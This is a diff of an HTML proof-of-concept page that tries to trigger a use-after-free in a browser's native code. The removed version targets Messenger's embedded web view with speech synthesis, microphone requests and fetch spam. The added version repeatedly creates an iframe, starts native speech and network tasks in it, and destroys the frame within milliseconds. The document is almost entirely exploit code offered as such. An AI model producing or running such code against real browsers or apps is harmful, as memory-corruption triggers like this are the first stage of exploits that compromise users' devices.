@@ -1,32 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head><title>C++ UAF Trigger</title></head>
+<head><title>IFrame UAF Fuzzer</title></head>
 <body>
+<h2 style="color:red;">Fuzzing internal frames...</h2>
+<div id="container"></div>
+
 <script>
-    function triggerNativeAsyncUAF() {
-        // 1. Bind to the C++ Speech Synthesis engine
-        // This runs asynchronously in a separate native thread
-        let utterance = new SpeechSynthesisUtterance("A".repeat(5000));
-        window.speechSynthesis.speak(utterance);
+    function triggerUAF() {
+        let container = document.getElementById('container');
+        
+        // 1. Create a child frame
+        let iframe = document.createElement('iframe');
+        container.appendChild(iframe);
+        
+        let iwin = iframe.contentWindow;
+        
+        try {
+            // 2. Start an async native task tied to the frame's context
+            // SpeechSynthesis calls cross the JNI bridge to the main process
+            let u = new iwin.SpeechSynthesisUtterance("A".repeat(2000));
+            iwin.speechSynthesis.speak(u);
+            
+            // Also spam the network stack
+            iwin.fetch(window.location.href).then(r => r.blob());
+        } catch(e) {}
 
-        // 2. Bind to the C++ Media IPC
-        navigator.mediaDevices.getUserMedia({ audio: true }).catch(e => {});
-
-        // 3. Spam massive Fetch API blobs to choke the C++ Network Service
-        for(let i = 0; i < 50; i++) {
-            fetch(window.location.href)
-                .then(r => r.blob())
-                .then(blob => blob.text());
-        }
-
-        // 4. Force the renderer to panic internally right as the Back button is hit
+        // 3. Immediately destroy the frame.
+        // This frees the RenderFrameHost in C++ while the async tasks are still pending.
         setTimeout(() => {
-            document.body.remove();
-        }, 100);
+            container.innerHTML = '';
+        }, 5);
     }
 
-    // Give Messenger 300ms to fully attach the WebContents, then fire
-    setTimeout(triggerNativeAsyncUAF, 300);
+    // Run the loop aggressively 
+    setInterval(triggerUAF, 50);
 </script>
 </body>
 </html>
